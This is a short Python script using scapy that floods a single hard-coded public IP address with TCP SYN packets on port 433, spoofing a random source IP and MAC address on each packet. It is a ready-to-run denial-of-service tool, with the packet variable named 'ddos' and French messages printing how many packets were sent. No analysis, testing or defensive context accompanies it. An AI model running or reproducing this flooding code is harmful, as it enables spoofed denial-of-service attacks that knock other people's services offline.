from scapy.all import *
import random
import socket
import struct
import time

def random_ip():
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

try:
    packet_count = 0
    while True:
          source_ip = random_ip()
          dest_port = 433
          ddos = Ether(src=RandMAC()) \
                     /IP(src=source_ip, dst="62.210.100.5") \
                     /TCP(dport=433, flags="S") \

          sendp(ddos, iface="eth0")
          packet_count += 1
except KeyboardInterrupt:
    print("Arret de l'envoi des trames.")
    print("Nombre de paquets envoy  s:", packet_count)
